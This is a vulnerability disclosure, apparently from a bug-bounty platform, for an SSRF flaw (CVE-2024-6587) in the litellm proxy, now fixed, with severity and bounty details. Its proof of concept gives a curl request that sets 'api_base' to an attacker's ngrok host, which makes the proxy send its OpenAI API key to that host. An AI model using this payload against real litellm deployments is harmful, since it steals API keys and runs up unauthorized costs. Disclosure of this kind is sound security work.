@@ -1,0 +1,50 @@
+Title: SSRF Exposes OpenAI API Keys in berriai/litellm
+
+Proof of Concept: 
+1: Start ngrok server
+
+$ ngrok http 10000
+
+2: Copy ngrok server address (e.g.: https://f000-000-00-00-00.ngrok-free.app)
+
+3: Start litellm proxy
+
+$ pip install 'litellm[proxy]'
+$ export OPENAI_API_KEY=sk-XXXXXXXXXXXX
+$ litellm --model gpt-3.5-turbo
+
+4: Send curl request
+
+$ curl -X 'POST' 'http://0.0.0.0:4000/chat/completions' \
+  -H 'Content-Type: application/json' \
+  --data '{
+    "model": "gpt-3.5-turbo",
+    "messages": [
+      {"role": "user","content": "hello"}
+    ],
+    "api_base": "https://f000-000-00-00-00.ngrok-free.app"
+  }'
+
+5: Confirm ngrok log (http://locahost:4000)
+
+Impact: 
+The SSRF vulnerability results in the leakage of the OpenAI keys that are managed by the proxy. If an attacker exploits this vulnerability, they can directly send requests to OpenAI without going through the proxy. This direct access allows them to bypass the proxy's rate limiting and budget management controls, potentially resulting in unauthorized usage and increased costs.In addition, there are also common risks associated with Blind SSRF (such as scanning the internal network).
+
+CVE ID: CVE-2024-6587
+Status: (published)
+Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: 1.38.10
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $750
+Fix Bounty: $187.5
